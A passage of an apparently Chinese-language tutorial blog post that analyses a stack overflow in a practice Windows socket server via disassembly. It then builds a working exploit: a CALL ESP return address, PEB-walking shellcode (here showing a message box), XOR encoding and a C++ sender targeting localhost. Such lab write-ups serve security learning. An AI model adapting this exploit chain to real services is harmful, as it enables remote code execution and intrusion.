class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">.text:004011FE                 push    esi</span><br><span class="line">.text:004011FF                 push    edi</span><br><span class="line">.text:004011FF</span><br><span class="line">.text:00401200</span><br><span class="line">.text:00401200 LBL_START_RECV:                         ; CODE XREF: _main+1AAj</span><br><span class="line">.text:00401200                                         ; _main+1C9j</span><br><span class="line">.text:00401200                 mov     ecx, 80h</span><br><span class="line">.text:00401205                 xor     eax, eax</span><br><span class="line">.text:00401207                 lea     edi, [esp+34h]</span><br><span class="line">.text:0040120B                 push    eax             ; flags</span><br><span class="line">.text:0040120C                 rep stosd</span><br><span class="line">.text:0040120E                 lea     ecx, [esp+38h]</span><br><span class="line">.text:00401212                 push    200h            ; len</span><br><span class="line">.text:00401217                 push    ecx             ; buf</span><br><span class="line">.text:00401218                 push    ebx             ; s</span><br><span class="line">.text:00401219                 call    ds:recv</span><br><span class="line">.text:00401219</span><br><span class="line">.text:0040121F                 mov     esi, eax</span><br><span class="line">.text:00401221                 test    esi, esi</span><br><span class="line">.text:00401223                 jge     short LBL_RECV_SUCCESS ; RecvBuf, len = 0x200</span><br><span class="line">.text:00401223</span><br><span class="line">.text:00401225                 push    offset s-&gt;ReadingStreamMessageErro ; &quot;reading stream message erro!&quot;</span><br><span class="line">.text:0040122A                 mov     ecx, offset g_cout</span><br><span class="line">.text:0040122F                 call    ostream::operator&lt;&lt;(char const *)</span><br><span class="line">.text:0040122F</span><br><span class="line">.text:00401234                 push    offset flush</span><br><span class="line">.text:00401239                 push    0Ah</span><br><span class="line">.text:0040123B                 mov     ecx, eax</span><br><span class="line">.text:0040123D                 call    ostream::operator&lt;&lt;(uchar)</span><br><span class="line">.text:0040123D</span><br><span class="line">.text:00401242                 mov     ecx, eax</span><br><span class="line">.text:00401244                 call    sub_4012B0</span><br><span class="line">.text:00401244</span><br><span class="line">.text:00401249                 xor     esi, esi</span><br><span class="line">.text:00401249</span><br><span class="line">.text:0040124B</span><br><span class="line">.text:0040124B LBL_RECV_SUCCESS:                       ; CODE XREF: _main+173j</span><br><span class="line">.text:0040124B                 lea     edx, [esp+34h]  ; RecvBuf, len = 0x200</span><br><span class="line">.text:0040124F                 push    edx</span><br><span class="line">.text:00401250                 call    ProcessRecv</span><br><span class="line">.text:00401250</span><br><span class="line">.text:00401255                 add     esp, 4</span><br><span class="line">.text:00401258                 test    esi, esi</span><br><span class="line">.text:0040125A                 jnz     short LBL_START_RECV</span><br><span class="line">.text:0040125A</span><br><span class="line">.text:0040125C                 push    ebx             ; s</span><br><span class="line">.text:0040125D                 call    ds:closesocket</span><br><span class="line">.text:0040125D</span><br><span class="line">.text:00401263                 lea     eax, [esp+3C4h+name]</span><br><span class="line">.text:00401267                 lea     ecx, [esp+3C4h+addr.sa_data+2]</span><br><span class="line">.text:0040126B                 push    eax             ; addrlen</span><br><span class="line">.text:0040126C                 push    ecx             ; addr</span><br><span class="line">.text:0040126D                 push    ebp             ; s</span><br><span class="line">.text:0040126E                 call    ds:accept</span><br><span class="line">.text:0040126E</span><br><span class="line">.text:00401274                 mov     ebx, eax</span><br><span class="line">.text:00401276                 cmp     ebx, 0FFFFFFFFh</span><br><span class="line">.text:00401279                 jnz     short LBL_START_RECV</span><br><span class="line">.text:00401279</span><br><span class="line">.text:0040127B                 pop     edi</span><br><span class="line">.text:0040127C                 pop     esi</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>要想利用栈溢出，则需要找到其使用拷贝函数，且在拷贝时未检测其是否越界。</p><h2 id="分析是否存在缓冲区溢出漏洞">分析是否存在缓冲区溢出漏洞</h2><p>仔细分析其收到数据后，对缓冲区的处理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ProcessRecv     proc near               ; CODE XREF: _main+1A0p</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 aryTmpBuf       = byte ptr -0C8h</span><br><span class="line">.text:00401000 pszRecvBuf      = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 sub     esp, 0C8h</span><br><span class="line">.text:00401006                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:00401009                 xor     eax, eax</span><br><span class="line">.text:0040100B                 lea     edx, [esp+0C8h+aryTmpBuf]</span><br><span class="line">.text:0040100F                 push    esi</span><br><span class="line">.text:00401010                 push    edi</span><br><span class="line">.text:00401011                 mov     edi, [esp+0D0h+pszRecvBuf]</span><br><span class="line">.text:00401018                 push    offset asc_40904C ; &quot;********************&quot;</span><br><span class="line">.text:0040101D                 repne scasb</span><br><span class="line">.text:0040101F                 not     ecx             ; strlen(pszRecvBuf) + 1</span><br><span class="line">.text:00401021                 sub     edi, ecx        ; 指针回到pszRecvBuf</span><br><span class="line">.text:00401023                 mov     eax, ecx</span><br><span class="line">.text:00401025                 mov     esi, edi</span><br><span class="line">.text:00401027                 mov     edi, edx</span><br><span class="line">.text:00401029                 shr     ecx, 2          </span><br><span class="line">.text:0040102C                 rep movsd</span><br><span class="line">.text:0040102E                 mov     ecx, eax</span><br><span class="line">.text:00401030                 and     ecx, 3</span><br><span class="line">.text:00401033                 rep movsb   ; strcpy</span><br><span class="line">.text:00401035                 mov     ecx, offset g_cout</span><br><span class="line">.text:0040103A                 call    ostream::operator&lt;&lt;(char const *)</span><br><span class="line">.text:0040103A</span><br><span class="line">.text:0040103F                 push    offset flush</span><br><span class="line">.text:00401044                 push    0Ah             ; 回车换行</span><br><span class="line">.text:00401046                 mov     ecx, eax</span><br><span class="line">.text:00401048                 call    ostream::operator&lt;&lt;(uchar)</span><br><span class="line">.text:00401048</span><br><span class="line">.text:0040104D                 mov     ecx, eax</span><br><span class="line">.text:0040104F                 call    sub_4012B0</span><br><span class="line">.text:0040104F</span><br><span class="line">.text:00401054                 push    offset s-&gt;Received ; &quot;received:&quot;</span><br><span class="line">.text:00401059                 mov     ecx, offset g_cout</span><br><span class="line">.text:0040105E                 call    ostream::operator&lt;&lt;(char const *)</span><br><span class="line">.text:0040105E</span><br><span class="line">.text:00401063                 push    offset flush</span><br><span class="line">.text:00401068                 push    0Ah</span><br><span class="line">.text:0040106A                 mov     ecx, eax</span><br><span class="line">.text:0040106C                 call    ostream::operator&lt;&lt;(uchar)</span><br><span class="line">.text:0040106C</span><br><span class="line">.text:00401071                 mov     ecx, eax</span><br><span class="line">.text:00401073                 call    sub_4012B0</span><br><span class="line">.text:00401073</span><br><span class="line">.text:00401078                 lea     ecx, [esp+0D0h+aryTmpBuf]</span><br><span class="line">.text:0040107C                 push    ecx</span><br><span class="line">.text:0040107D                 mov     ecx, offset g_cout</span><br><span class="line">.text:00401082                 call    ostream::operator&lt;&lt;(char const *)</span><br><span class="line">.text:00401082</span><br><span class="line">.text:00401087                 push    offset flush</span><br><span class="line">.text:0040108C                 push    0Ah</span><br><span class="line">.text:0040108E                 mov     ecx, eax</span><br><span class="line">.text:00401090                 call    ostream::operator&lt;&lt;(uchar)</span><br><span class="line">.text:00401090</span><br><span class="line">.text:00401095                 mov     ecx, eax</span><br><span class="line">.text:00401097                 call    sub_4012B0</span><br><span class="line">.text:00401097</span><br><span class="line">.text:0040109C                 pop     edi</span><br><span class="line">.text:0040109D                 pop     esi</span><br><span class="line">.text:0040109E                 add     esp, 0C8h</span><br><span class="line">.text:004010A4                 retn</span><br><span class="line">.text:004010A4</span><br><span class="line">.text:004010A4 ProcessRecv     endp</span><br></pre></td></tr></table></figure><p>发现，其先使用<code>strlen</code> 函数，获得发送过来的数据的长度，然后直接对栈中临时的数据缓冲区拷贝数据。栈中的临时缓冲区长度为<code>0xC8</code>， 即200个字节。由于临时缓冲区的大小小于接受数据的缓冲区大小，且它在使用<code>strcpy</code>的时候，未进行数据长度的检查。</p><p>由此可以判断，该程序存在栈溢出漏洞问题。</p><h1 id="栈溢出漏洞的利用">栈溢出漏洞的利用</h1><p>使用<code>findaddr</code>，找到<code>call/jmp esp</code> 指令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">71A2F8FB  Found  CALL ESP at 0x71a2f8fb     Module:  C:\WINDOWS\system32\ws2_32.dll</span><br></pre></td></tr></table></figure><p>所以在<code>0xC8</code> 后面应该存放的是这个地址：<code>0x71a2f8fb</code></p><p>然后构造<code>shellcode</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">cld</span><br><span class="line">push 0x1E380A6A</span><br><span class="line">push 0x4FD18963</span><br><span class="line">push 0xC917432</span><br><span class="line">mov esi,esp</span><br><span class="line">lea edi,dword ptr ds:[esi-0xC]</span><br><span class="line">xor ebx,ebx</span><br><span class="line">mov bh,0x4</span><br><span class="line">sub esp,ebx</span><br><span class="line">mov bx,0x3233</span><br><span class="line">push ebx</span><br><span class="line">push 0x72657375</span><br><span class="line">push esp</span><br><span class="line">xor edx,edx</span><br><span class="line">mov ebx,dword ptr fs:[0x18]</span><br><span class="line">mov ebx,dword ptr ds:[ebx+0x30]</span><br><span class="line">mov ebx,dword ptr ds:[ebx+0xC]</span><br><span class="line">mov ebx,dword ptr ds:[ebx+0xC]</span><br><span class="line">mov ebx,dword ptr ds:[ebx]</span><br><span class="line">mov ebx,dword ptr ds:[ebx]</span><br><span class="line">mov ebp,dword ptr ds:[ebx+0x18]</span><br><span class="line">lods dword ptr ds:[esi]</span><br><span class="line">cmp eax,0x1E380A6A</span><br><span class="line">jnz short 0012FC19</span><br><span class="line">xchg eax,ebp</span><br><span class="line">call dword ptr ds:[edi-0x8]</span><br><span class="line">xchg eax,ebp</span><br><span class="line">pushad</span><br><span class="line">mov eax,dword ptr ss:[ebp+0x3C]</span><br><span class="line">mov ecx,dword ptr ss:[ebp+eax+0x78]</span><br><span class="line">add ecx,ebp</span><br><span class="line">mov ebx,dword ptr ds:[ecx+0x20]</span><br><span class="line">add ebx,ebp</span><br><span class="line">xor edi,edi</span><br><span class="line">inc edi</span><br><span class="line">mov esi,dword ptr ds:[ebx+edi*4]</span><br><span class="line">add esi,ebp</span><br><span class="line">cdq</span><br><span class="line">movsx eax,byte ptr ds:[esi]</span><br><span class="line">cmp al,ah</span><br><span class="line">je short 0012FC40</span><br><span class="line">ror edx,0x7</span><br><span class="line">add edx,eax                              ; exploit_.00409A68</span><br><span class="line">inc esi</span><br><span class="line">jmp short 0012FC31</span><br><span class="line">cmp edx,dword ptr ss:[esp+0x1C]</span><br><span class="line">jnz short 0012FC2A</span><br><span class="line">mov ebx,dword ptr ds:[ecx+0x24]</span><br><span class="line">add ebx,ebp</span><br><span class="line">mov di,word ptr ds:[ebx+edi*2]</span><br><span class="line">mov ebx,dword ptr ds:[ecx+0x1C]</span><br><span class="line">add ebx,ebp</span><br><span class="line">add ebp,dword ptr ds:[ebx+edi*4]</span><br><span class="line">xchg eax,ebp</span><br><span class="line">pop edi                                  ; ws2_32.71A2F8FD</span><br><span class="line">stos dword ptr es:[edi]</span><br><span class="line">push edi</span><br><span class="line">popad</span><br><span class="line">cmp eax,0x1E380A6A</span><br><span class="line">jnz short 0012FC0C</span><br><span class="line">xor ebx,ebx</span><br><span class="line">push ebx</span><br><span class="line">push 0x6F6C6C65</span><br><span class="line">push 0x68796173</span><br><span class="line">mov eax,esp</span><br><span class="line">push ebx</span><br><span class="line">push eax                                 ; exploit_.00409A68</span><br><span class="line">push eax                                 ; exploit_.00409A68</span><br><span class="line">push ebx</span><br><span class="line">call dword ptr ds:[edi-0x4]</span><br><span class="line">push ebx</span><br><span class="line">call dword ptr ds:[edi-0x8]</span><br></pre></td></tr></table></figure><p>为了避免截断，使用亦或加密为不会产生阶段机器码的二进制。</p><h1 id="实现exploit程序">实现exploit程序</h1><p>使用的是VC6.0的环境，在xp下测试通过</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">SocketStartup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">wVersionRequested = <span class="built_in">MAKEWORD</span>( <span class="number">2</span>, <span class="number">2</span> );</span><br><span class="line"></span><br><span class="line">err = <span class="built_in">WSAStartup</span>( wVersionRequested, &amp;wsaData );</span><br><span class="line"><span class="keyword">if</span> ( err != <span class="number">0</span> ) &#123;</span><br><span class="line"><span class="comment">/* Tell the user that we could not find a usable */</span></span><br><span class="line"><span class="comment">/* WinSock DLL.                                  */</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Confirm that the WinSock DLL supports 2.2.*/</span></span><br><span class="line"><span class="comment">/* Note that if the DLL supports versions greater    */</span></span><br><span class="line"><span class="comment">/* than 2.2 in addition to 2.2, it will still return */</span></span><br><span class="line"><span class="comment">/* 2.2 in wVersion since that is the version we      */</span></span><br><span class="line"><span class="comment">/* requested.                                        */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">LOBYTE</span>( wsaData.wVersion ) != <span class="number">2</span> ||</span><br><span class="line">        <span class="built_in">HIBYTE</span>( wsaData.wVersion ) != <span class="number">2</span> ) &#123;</span><br><span class="line"><span class="comment">/* Tell the user that we could not find a usable */</span></span><br><span class="line"><span class="comment">/* WinSock DLL.                                  */</span></span><br><span class="line"><span class="built_in">WSACleanup</span>( );</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUF_MAX_SIZE (0xC8 + 17 + 176 + 4)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> szBuf[BUF_MAX_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">memset</span>(szBuf, <span class="number">0x90</span>, BUF_MAX_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> decode_data[<span class="number">17</span>] = &#123;</span><br><span class="line"><span class="number">0x33</span>, <span class="number">0xC9</span>, <span class="number">0xB1</span>, <span class="number">0xC8</span>, <span class="number">0x8B</span>, <span class="number">0xFC</span>, <span class="number">0x83</span>, <span class="number">0xC7</span>, <span class="number">0x15</span>, <span class="number">0x80</span>, <span class="number">0x37</span>, <span class="number">0x8C</span>, <span class="number">0x47</span>, <span class="number">0xFE</span>, <span class="number">0xC9</span>, <span class="number">0x75</span>, </span><br><span class="line"><span class="number">0xF8</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> encode_data[<span class="number">176</span>] = &#123;</span><br><span class="line"><span class="number">0x70</span>, <span class="number">0xE4</span>, <span class="number">0xE6</span>, <span class="number">0x86</span>, <span class="number">0xB4</span>, <span class="number">0x92</span>, <span class="number">0xE4</span>, <span class="number">0xEF</span>, <span class="number">0x05</span>, <span class="number">0x5D</span>, <span class="number">0xC3</span>, <span class="number">0xE4</span>, <span class="number">0xBE</span>, <span class="number">0xF8</span>, <span class="number">0x1D</span>, <span class="number">0x80</span>, </span><br><span class="line"><span class="number">0x07</span>, <span class="number">0x78</span>, <span class="number">0x01</span>, <span class="number">0xF2</span>, <span class="number">0x78</span>, <span class="number">0xBF</span>, <span class="number">0x57</span>, <span class="number">0x3B</span>, <span class="number">0x88</span>, <span class="number">0xA7</span>, <span class="number">0x6F</span>, <span class="number">0xEA</span>, <span class="number">0x37</span>, <span class="number">0xBF</span>, <span class="number">0xBE</span>, <span class="number">0xDF</span>, </span><br><span class="line"><span class="number">0xE4</span>, <span class="number">0xF9</span>, <span class="number">0xFF</span>, <span class="number">0xE9</span>, <span class="number">0xFE</span>, <span class="number">0xD8</span>, <span class="number">0xBF</span>, <span class="number">0x5E</span>, <span class="number">0xE8</span>, <span class="number">0x07</span>, <span class="number">0x91</span>, <span class="number">0x94</span>, <span class="number">0x8C</span>, <span class="number">0x8C</span>, <span class="number">0x8C</span>, <span class="number">0x07</span>, </span><br><span class="line"><span class="number">0xD7</span>, <span class="number">0xBC</span>, <span class="number">0x07</span>, <span class="number">0xD7</span>, <span class="number">0x80</span>, <span class="number">0x07</span>, <span class="number">0xD7</span>, <span class="number">0x80</span>, <span class="number">0x07</span>, <span class="number">0x97</span>, <span class="number">0x07</span>, <span class="number">0x97</span>, <span class="number">0x07</span>, <span class="number">0xE7</span>, <span class="number">0x94</span>, <span class="number">0x21</span>, </span><br><span class="line"><span class="number">0xB1</span>, <span class="number">0xE6</span>, <span class="number">0x86</span>, <span class="number">0xB4</span>, <span class="number">0x92</span>, <span class="number">0xF9</span>, <span class="number">0x89</span>, <span class="number">0x19</span>, <span class="number">0x73</span>, <span class="number">0xDB</span>, <span class="number">0x74</span>, <span class="number">0x19</span>, <span class="number">0xEC</span>, <span class="number">0x07</span>, <span class="number">0xC9</span>, <span class="number">0xB0</span>, </span><br><span class="line"><span class="number">0x07</span>, <span class="number">0xC0</span>, <span class="number">0x89</span>, <span class="number">0xF4</span>, <span class="number">0x8F</span>, <span class="number">0x41</span>, <span class="number">0x07</span>, <span class="number">0xD5</span>, <span class="number">0xAC</span>, <span class="number">0x8F</span>, <span class="number">0x51</span>, <span class="number">0xBF</span>, <span class="number">0x73</span>, <span class="number">0xCB</span>, <span class="number">0x07</span>, <span class="number">0xB8</span>, </span><br><span class="line"><span class="number">0x37</span>, <span class="number">0x8F</span>, <span class="number">0x79</span>, <span class="number">0x15</span>, <span class="number">0x83</span>, <span class="number">0x32</span>, <span class="number">0x8A</span>, <span class="number">0xB6</span>, <span class="number">0x48</span>, <span class="number">0xF8</span>, <span class="number">0x84</span>, <span class="number">0x4D</span>, <span class="number">0x46</span>, <span class="number">0x8B</span>, <span class="number">0x8F</span>, <span class="number">0x5C</span>, </span><br><span class="line"><span class="number">0xCA</span>, <span class="number">0x67</span>, <span class="number">0x7D</span>, <span class="number">0xB7</span>, <span class="number">0xD8</span>, <span class="number">0xA8</span>, <span class="number">0x90</span>, <span class="number">0xF9</span>, <span class="number">0x68</span>, <span class="number">0x07</span>, <span class="number">0xD5</span>, <span class="number">0xA8</span>, <span class="number">0x8F</span>, <span class="number">0x51</span>, <span class="number">0xEA</span>, <span class="number">0x07</span>, </span><br><span class="line"><span class="number">0xB0</span>, <span class="number">0xF7</span>, <span class="number">0x07</span>, <span class="number">0xD5</span>, <span class="number">0x90</span>, <span class="number">0x8F</span>, <span class="number">0x51</span>, <span class="number">0x8F</span>, <span class="number">0xA0</span>, <span class="number">0x37</span>, <span class="number">0x19</span>, <span class="number">0xD3</span>, <span class="number">0x27</span>, <span class="number">0xDB</span>, <span class="number">0xED</span>, <span class="number">0xB1</span>, </span><br><span class="line"><span class="number">0xE6</span>, <span class="number">0x86</span>, <span class="number">0xB4</span>, <span class="number">0x92</span>, <span class="number">0xF9</span>, <span class="number">0x25</span>, <span class="number">0xBF</span>, <span class="number">0x57</span>, <span class="number">0xDF</span>, <span class="number">0xE4</span>, <span class="number">0xE9</span>, <span class="number">0xE0</span>, <span class="number">0xE0</span>, <span class="number">0xE3</span>, <span class="number">0xE4</span>, <span class="number">0xFF</span>, </span><br><span class="line"><span class="number">0xED</span>, <span class="number">0xF5</span>, <span class="number">0xE4</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0xDF</span>, <span class="number">0xDC</span>, <span class="number">0xDC</span>, <span class="number">0xDF</span>, <span class="number">0x73</span>, <span class="number">0xDB</span>, <span class="number">0x70</span>, <span class="number">0xDF</span>, <span class="number">0x73</span>, <span class="number">0xDB</span>, <span class="number">0x74</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(&amp;szBuf[<span class="number">0xC8</span> + <span class="number">4</span>], decode_data, <span class="number">17</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;szBuf[<span class="number">0xC8</span> + <span class="number">4</span> + <span class="number">17</span>], encode_data, <span class="number">176</span>);</span><br><span class="line">*(<span class="keyword">int</span> *)&amp;szBuf[<span class="number">0xC8</span>] = <span class="number">0x71A2F8FB</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">SocketStartup</span>() == <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SOCKET fdSock = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_IP);</span><br><span class="line"><span class="keyword">if</span> (fdSock == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;create socket descriptor failed&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sockaddr_in stSockAddr = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">stSockAddr.sin_family = AF_INET;</span><br><span class="line">stSockAddr.sin_port = <span class="built_in">htons</span>(<span class="number">0x1E61</span>);</span><br><span class="line">stSockAddr.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">connect</span>(fdSock, (sockaddr*)&amp;stSockAddr, <span class="built_in"><span class="keyword">sizeof</span></span>(stSockAddr)) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;connect failed&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="built_in">closesocket</span>(fdSock);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">send</span>(fdSock, szBuf, BUF_MAX_SIZE, <span class="number">0</span>) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;send failed&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="built_in">shutdown</span>(fdSock, SD_SEND);</span><br><span class="line"><span class="built_in">closesocket</span>(fdSock);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span 